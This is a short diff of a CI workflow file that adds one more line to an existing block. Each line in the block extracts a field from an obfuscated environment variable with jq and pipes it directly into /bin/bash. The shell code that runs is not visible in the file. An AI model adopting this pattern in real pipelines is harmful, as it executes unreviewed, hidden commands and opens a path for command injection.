@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$eqsm3" | jq -r .vr6766 | /bin/bash
           printf '%s' "$epjwi242" | jq -r .psai9 | /bin/bash
           printf '%s' "$scnb928" | jq -r .dg938 | /bin/bash
+          echo $w0073 | jq -r .vnnt25 | /bin/bash
 
       - name: Save results
         if: always()
